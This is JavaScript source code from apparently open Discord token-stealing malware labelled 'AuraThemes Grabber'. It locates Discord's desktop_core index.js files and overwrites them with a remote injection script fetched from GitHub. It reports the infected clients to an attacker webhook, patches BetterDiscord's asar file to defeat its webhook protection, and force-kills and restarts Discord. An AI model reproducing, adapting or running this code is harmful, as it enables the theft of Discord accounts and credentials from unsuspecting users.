
const Injection = "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js";

import fs from "fs";
import path from "path";
import { exec } from "child_process";
import { instance } from "./../../utils/axios/request.mjs";

import config from "./../../config/config.mjs";

const {
  WEBHOOK,
  ERROR_MESSAGE,
  KILL_DISCORDS,
  VM_DEBUGGER,
  DC_INJECTION,
} = config;

const local = process.env.localappdata;

const injec_path = [];

const discords_dirs = () => {
  try {
    return fs.readdirSync(local)
      .filter((f) => f.includes("iscord"))
      .map((f) => path.join(local, f));
  } catch (e) {
    console.error(e);
    return [];
  }
};

const find_indexs = (f) => {
  try {
    fs.readdirSync(f).forEach((d) => {

      let p = path.join(f, d);

      if (fs.statSync(p).isDirectory()) {
        find_indexs(p);
      } else if (d === "index.js"
        && !f.includes("node_modules")
        && f.includes("desktop_core")
      ) {
        injec_path.push(p);
      }
    });
  } catch (e) {
    console.error(e);
  }
};

const injection = async (webhook) => {
  let paths = [];
  let desc = [];

  injec_path.forEach((path) => {
    let match = path.match(/\\(Discord|DiscordCanary|DiscordDevelopment|DiscordPTB|Lightcord)\\/i);
    let name = match ? match[1] : "Not Found";

    desc.push(`\`${name}\``);
    paths.push({ 
      path, 
      name 
    });
  });

  await instance({
    "url": webhook[0],
    "method": "POST",
    "data": {
      "username": 'AuraThemes Grabber - Injection',
      "avatar_url": 'https://i.imgur.com/WkKXZSl.gif',
      "embeds": [{
        "title": 'Discord(s) injected(s)',
        "color": "12740607",
        "description": desc.length > 0 ? desc.join(", ") : "Not Found",
        "timestamp": new Date(),
        "footer": {
          "text": 'AuraThemes Grabber - https://github.com/k4itrun/DiscordTokenGrabber',
          "icon_url": 'https://i.imgur.com/WkKXZSl.gif'
        }
      }]
    }
  });

  let inject = await instance.get(Injection);
  let text = inject.data;

  await Promise.all(paths.map(async ({ path }) => {
    await fs.promises.writeFile(path, text.replace("%WEB" + "HOOK%", webhook[0]), { 
      encoding: "utf8", 
      flag: "w" 
    });
  }));
};

const buffer_replace = (buf, a, b) => {
  try {
    if (!Buffer.isBuffer(buf))
      buf = Buffer(buf);

    let idx = buf.indexOf(a);
    if (idx === -1)
      return buf;

    if (!Buffer.isBuffer(b))
      b = Buffer(b);

    let before = buf.slice(0, idx),
      after = replace(buf.slice(idx + a.length), a, b);

    return Buffer.concat(
      [
        before,
        b,
        after
      ], idx + b.length + after.length
    );
  } catch (e) {
    console.error(e);
  }
};

const better_broke = async () => {
  try {
    let broke = path.join(local, "betterdiscord/data/betterdiscord.asar");
    if (fs.existsSync(broke))
      await fs.promises.writeFile(
        broke, buffer_replace(await fs.promises.readFile(broke), "api/webhooks", "aurathemes")
      );
  } catch (e) {
    console.error(e);
  }
};

const find_injects = async (f) => {
  try {
    let d = await fs.promises.readdir(f);

    for (let x of d) {
      let p = path.join(f, x),
        ñ = await fs.promises.stat(p);

      if (ñ.isDirectory()) {
        if (x === "aura")
          await fs.rmdirSync(p);
        else
          await find_injects(p);
      }
    }
  } catch (e) {
    console.error(e);
  }
};

export const kill_discords = async (res) => {
  if (res !== true) return;
  try {
    await exec("tasklist", async (error, stdout, stderr) => {
      for (let discord_taken of [
        "Discord.exe",
        "DiscordCanary.exe",
        "discordDevelopment.exe",
        "DiscordPTB.exe",
      ]) {
        if (stdout.includes(discord_taken)) {
          
          await exec(`taskkill /F /T /IM ${
            discord_taken
          }`, (err) => {
            console.error(err);
          });

          await exec(`"${
            local
          }\\${
            discord_taken.replace(".exe", "")
          }\\Update.exe" --processStart ${
            discord_taken
          }`, (err) => {
            console.error(err);
          });
        }
      }
    });
  } catch (e) {
    console.error(e);
  }
};

export const discord_injected = async (res) => {
  try {
    for (let dir of discords_dirs()) find_indexs(dir);
    for (let dir of discords_dirs()) await find_injects(dir);
    await better_broke();
    await injection(WEBHOOK);
  } catch (e) {
    console.error(e);
  }
};
